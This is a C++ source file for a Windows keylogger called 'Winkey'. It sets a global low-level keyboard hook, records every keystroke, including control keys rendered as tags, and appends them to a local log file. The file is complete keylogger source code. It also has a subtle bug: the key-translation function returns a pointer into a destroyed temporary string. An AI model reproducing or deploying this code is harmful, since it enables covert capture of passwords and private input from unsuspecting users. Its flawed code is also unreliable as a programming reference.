#include "winkey.h"

Winkey::Winkey() {
	gLogHandle = CreateFileA(
		LOG_FILE,
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (gLogHandle == INVALID_HANDLE_VALUE) {
		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
	}

	OVERLAPPED overlap = {0};

	if (!LockFileEx(
		gLogHandle,
		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
		0,
		1,
		0,
		&overlap
	)) {
		throw std::runtime_error(std::format("LockFileEx failed ({})\n", GetLastError()));
	}
}

Winkey::~Winkey() {
	if (gLogHandle == nullptr) {
		return;
	}

	OVERLAPPED overlap = { 0 };

	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
	}
	CloseHandle(gLogHandle);

	gLogHandle = nullptr;
}

int Winkey::Hook() {
	HHOOK logger = SetWindowsHookExA(WH_KEYBOARD_LL, &Winkey::onKey, NULL, 0);
	if (logger == nullptr) {
		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, WM_INPUT, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

/*
	HOOKPROC onKey;
*/
LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT kbdEv = (PKBDLLHOOKSTRUCT)lParam;

		const char* data = solve(kbdEv);
		DWORD bytesWrote;
		WriteFile(gLogHandle, data, std::strlen(data), &bytesWrote, NULL);
	}

	/* Forward to next hooks ... */
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

const char*	Winkey::solve(PKBDLLHOOKSTRUCT kbdEv) {
	switch (kbdEv->vkCode) {
	case VK_ESCAPE:		return "[ESC]";
	case VK_DELETE:		return "[DELETE]";
	case VK_LEFT:		return "[LEFTARROW]";
	case VK_UP:			return "[UPARROW]";
	case VK_RIGHT:		return "[RIGHTARROW]";
	case VK_DOWN:		return "[DOWNARROW]";
	case VK_SPACE:		return " ";
	case VK_TAB:		return "[TAB]";
	case VK_CAPITAL:	return "[CAPSLOCK]";
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:		return "[SHIFT]";
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:	return "[CTRL]";
	case VK_RETURN:		return "\n";
	default:
		return std::format("{:c}", kbdEv->vkCode).c_str();
	}
}

int __cdecl _tmain(int argc, TCHAR* argv[])
{
	(void)argv;
	if (argc != 1) {
		return 1;
	}

	gLogHandle = nullptr;

	try {
		auto winkey = Winkey();
		return winkey.Hook();
	 }
	catch (const std::runtime_error& e) {
		std::cout << e.what();
		return 1;
	}
}